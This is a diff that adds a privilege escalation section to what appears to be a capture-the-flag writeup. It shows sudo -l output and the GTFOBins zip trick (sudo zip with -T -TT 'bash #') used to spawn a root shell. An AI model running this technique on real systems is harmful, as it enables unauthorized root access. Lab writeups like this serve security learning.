@@ -108,6 +108,38 @@ Heeey, we are in.
 
 # Privilege Escalation
 
+Let's see what commands we can run with root privileges using command sudo -l
+
+```
+jeanpaul@dev:~$ sudo -l
+Matching Defaults entries for jeanpaul on dev:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jeanpaul may run the following commands on dev:
+    (root) NOPASSWD: /usr/bin/zip
+```
+
+We can run /usr/bin/zip with root privileges. How can we leverage that? I searched online, and i found that https://gtfobins.github.io/gtfobins/zip/.
+According to that resource, we can abuse /usr/bin/zip to get root access by running these commands
+```
+TF=$(mktemp -u)
+```
+
+This will create a temporery file and put in TF variable. If we see zip help, we will see -TT option which allows us to run commands. We can abuse that to get root
+access.
+
+```
+sudo zip $TF /etc/hosts -T -TT 'bash #'
+```
+
+![root_access](https://github.com/moataz-bellah/writeups/assets/47069499/0cfe0f2b-3e38-47cb-a797-ca9c5c35ae07)
+
+Yees, we root now.
+
+
+
+
+
 
 
 
